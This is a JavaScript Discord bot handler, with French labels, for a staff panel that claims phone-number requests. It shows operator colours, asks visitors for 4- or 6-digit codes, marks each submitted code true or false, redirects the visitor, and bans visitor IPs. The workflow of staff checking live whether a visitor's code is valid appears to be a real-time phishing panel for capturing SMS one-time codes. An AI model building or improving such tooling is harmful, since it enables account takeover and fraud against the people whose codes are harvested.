/**
 * buttons.js — Discord button interaction handler  (v2.2)
 *
 * v2.1 fixes: len4/len6 length param, sendRetryEmbed, unclaim restores Claim
 *             button, double-claim protection, fetch timeouts, unclaim logging.
 *
 * v2.2 additions:
 *  - Claimer-only enforcement: after a staff member claims a request,
 *    only that person can interact with the post-claim buttons
 *    (len4, len6, wrong, unclaim, truecode, falsecode).
 *  - Persistent claimer via claimed_by_discord_id DB column:
 *    if the bot restarts and the in-memory Map is empty, we fall back
 *    to the DB value so the lock is never silently lost.
 *  - banip remains open to all staff (not tied to a specific claim).
 *  - claim remains open to all staff (anyone can pick up a pending request).
 */

import {
    ButtonBuilder,
    ButtonStyle,
    ActionRowBuilder,
    EmbedBuilder,
} from "discord.js";
import { CONFIG }              from "../config.js";
import { getRequestByPhone, getClaimedBy } from "../database.js";
import { getOperatorColor }    from "../utils/colors.js";
import { formatPhone }         from "../utils/formatters.js";
import { buildRetryEmbed }     from "../utils/embedBuilder.js";
import { callStaffAction, callBanIP } from "../utils/api.js";

// ─── In-memory claimer Map: phone → Discord userId ────────────────────────────
export const claimedBy = new Map();

// ─── Helpers ──────────────────────────────────────────────────────────────────

/** Ban IP button, or null when IP is invalid. */
function createBanIPButton(ip) {
    if (!ip || ip === "unknown" || ip === "null" || !ip.includes(".")) return null;
    return new ButtonBuilder()
        .setCustomId("banip_" + ip)
        .setLabel("🚫 Ban IP")
        .setStyle(ButtonStyle.Danger);
}

/** Edit a message without crashing on stale tokens. */
async function safeEditMessage(message, options) {
    try {
        await message.edit(options);
    } catch (e) {
        console.warn("⚠️  Could not edit message (stale?):", e.message);
    }
}

/**
 * Claimer permission check.
 *
 * Returns the Discord userId of the claimer (string) if the interaction user
 * is NOT allowed to act, or null if they are allowed.
 *
 * Strategy:
 *  1. Check in-memory Map (fast, covers normal operation).
 *  2. If Map is empty (bot restart), fall back to DB column.
 *  3. Restore the Map entry from DB so subsequent checks stay fast.
 *  4. If no claimer is recorded at all, allow (edge case: very old requests).
 */
async function getUnauthorizedClaimer(phone, userId) {
    let claimer = claimedBy.get(phone) ?? null;

    if (!claimer) {
        // Bot restarted — restore from DB
        claimer = await getClaimedBy(phone);
        if (claimer) claimedBy.set(phone, claimer);
    }

    if (!claimer) return null;          // no claimer recorded → allow
    if (claimer === userId) return null; // correct claimer → allow
    return claimer;                     // someone else claimed it → deny
}

/** Reply with a persistent "not your request" message and return true. */
async function replyNotYourRequest(interaction, claimer) {
    await interaction.reply({
        content: `🔒 Cette demande a été claim par <@${claimer}>.\nSeul·e lui peut interagir avec ces boutons.`,
        flags: 64,
    });
    return true;
}

/**
 * Send a retry embed after a false code.
 * (v2.1: was called but never defined → ReferenceError crash)
 */
async function sendRetryEmbed(channel, row) {
    if (!channel) {
        console.warn("⚠️  sendRetryEmbed: log channel not found");
        return;
    }

    const embed  = buildRetryEmbed(row);
    const buttons = [
        new ButtonBuilder()
            .setCustomId("truecode_" + row.phone)
            .setLabel("✅ True Code")
            .setStyle(ButtonStyle.Success),
        new ButtonBuilder()
            .setCustomId("falsecode_" + row.phone)
            .setLabel("❌ False Code")
            .setStyle(ButtonStyle.Danger),
    ];
    const banBtn = createBanIPButton(row.ip_address);
    if (banBtn) buttons.push(banBtn);

    const claimer = claimedBy.get(row.phone);
    await channel.send({
        content: claimer ? `<@${claimer}>` : undefined,
        embeds: [embed],
        components: [new ActionRowBuilder().addComponents(...buttons)],
    });
}

// ─── Main handler ─────────────────────────────────────────────────────────────

export async function handleButton(interaction) {
    const [action, ...rest] = interaction.customId.split("_");
    const payload = rest.join("_");

    // ─── CLAIM — open to all staff ────────────────────────────────────────────
    if (action === "claim") {
        const phone = payload;
        await interaction.deferReply({ flags: 64 });

        try {
            // Pass Discord userId so the API stores it in claimed_by_discord_id
            const data = await callStaffAction(
                "claim", phone, interaction.user.tag,
                null, interaction.user.id
            );

            if (!data.success) {
                await interaction.editReply({
                    content: "❌ " + (data.message || "Déjà claim par un autre membre du staff."),
                });
                return;
            }

            // Register claimer in-memory
            claimedBy.set(phone, interaction.user.id);

            await interaction.editReply({
                content: `✅ Demande **${formatPhone(phone)}** claim par <@${interaction.user.id}>`,
            });

            const row   = await getRequestByPhone(phone);
            const color = getOperatorColor(row?.operator);

            const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(color)
                .setTitle("📋 Demande en cours")
                .setDescription(
                    `👤 Claim par <@${interaction.user.id}>\n\n**🔧 Choisissez une action :**`
                );

            const buttons = [
                new ButtonBuilder().setCustomId("len4_"   + phone).setLabel("🔢 4 chiffres").setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId("len6_"   + phone).setLabel("🔢 6 chiffres").setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId("wrong_"  + phone).setLabel("❌ Mauvais numéro").setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId("unclaim_"+ phone).setLabel("↩️ Unclaim").setStyle(ButtonStyle.Secondary),
            ];
            const banBtn = createBanIPButton(row?.ip_address);
            if (banBtn) buttons.push(banBtn);

            await safeEditMessage(interaction.message, {
                embeds: [newEmbed],
                components: [new ActionRowBuilder().addComponents(...buttons)],
            });
        } catch (e) {
            console.error("Claim error:", e);
            await interaction.editReply({ content: "❌ Erreur réseau lors du claim." });
        }
        return;
    }

    // ─── BAN IP — open to all staff (independent of claim) ───────────────────
    if (action === "banip") {
        const ip = payload;
        await interaction.deferReply({ flags: 64 });

        if (!ip || ip === "unknown" || ip === "null") {
            await interaction.editReply({ content: "❌ Impossible de bannir : IP invalide." });
            return;
        }

        try {
            const data = await callBanIP(ip, interaction.user.tag);
            if (!data.success) {
                await interaction.editReply({ content: "❌ " + data.message });
                return;
            }
            await interaction.editReply({ content: `🚫 IP **${ip}** bannie !` });

            const bannedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444)
                .setTitle("🔨 IP Bannie")
                .setDescription(`🚫 IP **${ip}** bannie par <@${interaction.user.id}>`);
            await safeEditMessage(interaction.message, {
                embeds: [bannedEmbed],
                components: [],
            });
        } catch (e) {
            console.error("banip error:", e);
            await interaction.editReply({ content: "❌ Erreur réseau lors du ban IP." });
        }
        return;
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  CLAIMER-ONLY BUTTONS — check permission before anything else
    // ══════════════════════════════════════════════════════════════════════════
    const phone     = payload;
    const otherUser = await getUnauthorizedClaimer(phone, interaction.user.id);
    if (otherUser) {
        await replyNotYourRequest(interaction, otherUser);
        return;
    }

    // ─── 4 CHIFFRES ───────────────────────────────────────────────────────────
    if (action === "len4") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 4);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }

            await interaction.editReply({ content: `✅ Code 4 chiffres demandé pour ${formatPhone(phone)}` });

            const row = await getRequestByPhone(phone);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(getOperatorColor(row?.operator))
                .setTitle("⏳ Attente du code (4 chiffres)")
                .setDescription("👤 Claim\n🔢 Code demandé : **4 chiffres**");
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) {
            console.error("len4 error:", e);
            await interaction.editReply({ content: "❌ Erreur lors de la définition de la longueur." });
        }
        return;
    }

    // ─── 6 CHIFFRES ───────────────────────────────────────────────────────────
    if (action === "len6") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("set_length", phone, interaction.user.tag, 6);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }

            await interaction.editReply({ content: `✅ Code 6 chiffres demandé pour ${formatPhone(phone)}` });

            const row = await getRequestByPhone(phone);
            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(getOperatorColor(row?.operator))
                .setTitle("⏳ Attente du code (6 chiffres)")
                .setDescription("👤 Claim\n🔢 Code demandé : **6 chiffres**");
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) {
            console.error("len6 error:", e);
            await interaction.editReply({ content: "❌ Erreur lors de la définition de la longueur." });
        }
        return;
    }

    // ─── MAUVAIS NUMÉRO ───────────────────────────────────────────────────────
    if (action === "wrong") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("wrong_number", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }

            await interaction.editReply({ content: `✅ Mauvais numéro signalé pour ${formatPhone(phone)}` });
            claimedBy.delete(phone);

            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444)
                .setTitle("❌ Mauvais numéro")
                .setDescription("❌ L'utilisateur a été redirigé pour ressaisir son numéro.");
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) {
            console.error("wrong number error:", e);
            await interaction.editReply({ content: "❌ Erreur lors du signalement." });
        }
        return;
    }

    // ─── UNCLAIM ──────────────────────────────────────────────────────────────
    if (action === "unclaim") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("unclaim", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }

            claimedBy.delete(phone);
            await interaction.editReply({
                content: `↩️ Demande **${formatPhone(phone)}** unclaimée. Retour dans la file.`,
            });

            // Restore Claim button so any staff member can pick it up again
            const reclaimBtn = new ButtonBuilder()
                .setCustomId("claim_" + phone)
                .setLabel("📋 Claim")
                .setStyle(ButtonStyle.Primary);
            const row    = await getRequestByPhone(phone);
            const banBtn = createBanIPButton(row?.ip_address);
            const btns   = banBtn ? [reclaimBtn, banBtn] : [reclaimBtn];

            const unclaimedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x6b7280)
                .setTitle("📭 Demande unclaimée")
                .setDescription(
                    `↩️ Unclaimée par <@${interaction.user.id}>\nCette demande est revenue dans la file d'attente.`
                );
            await safeEditMessage(interaction.message, {
                embeds: [unclaimedEmbed],
                components: [new ActionRowBuilder().addComponents(...btns)],
            });
        } catch (e) {
            console.error("Unclaim error:", e);
            await interaction.editReply({ content: "❌ Erreur lors de l'unclaim." });
        }
        return;
    }

    // ─── TRUE CODE ────────────────────────────────────────────────────────────
    if (action === "truecode") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("true_code", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }

            await interaction.editReply({ content: `✅ Code validé pour ${formatPhone(phone)}` });
            claimedBy.delete(phone);

            const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0x10b981)
                .setTitle("✅ Code validé")
                .setDescription(
                    `👤 Validé par <@${interaction.user.id}>\nL'utilisateur est redirigé vers la page de succès.`
                );
            await safeEditMessage(interaction.message, { embeds: [doneEmbed], components: [] });
        } catch (e) {
            console.error("truecode error:", e);
            await interaction.editReply({ content: "❌ Erreur lors de la validation." });
        }
        return;
    }

    // ─── FALSE CODE ───────────────────────────────────────────────────────────
    if (action === "falsecode") {
        await interaction.deferReply({ flags: 64 });
        try {
            const data = await callStaffAction("false_code", phone, interaction.user.tag);
            if (!data.success) { await interaction.editReply({ content: "❌ " + data.message }); return; }

            await interaction.editReply({
                content: `❌ Code refusé pour ${formatPhone(phone)}. L'utilisateur doit ressaisir un nouveau code.`,
            });

            const refusedEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                .setColor(0xef4444)
                .setTitle("❌ Code refusé")
                .setDescription(
                    `❌ Refusé par <@${interaction.user.id}>\nL'utilisateur a été redirigé pour saisir un nouveau code.`
                );
            await safeEditMessage(interaction.message, { embeds: [refusedEmbed], components: [] });

            // Send fresh retry embed so the claimer can validate the next code
            const row = await getRequestByPhone(phone);
            if (row) {
                const channel = interaction.client.channels.cache.get(CONFIG.LOG_CHANNEL_ID);
                await sendRetryEmbed(channel, row);
            }
        } catch (e) {
            console.error("falsecode error:", e);
            await interaction.editReply({ content: "❌ Erreur lors du refus du code." });
        }
        return;
    }

    // Unknown button
    console.warn("⚠️  Unknown button action:", action, "payload:", payload);
}
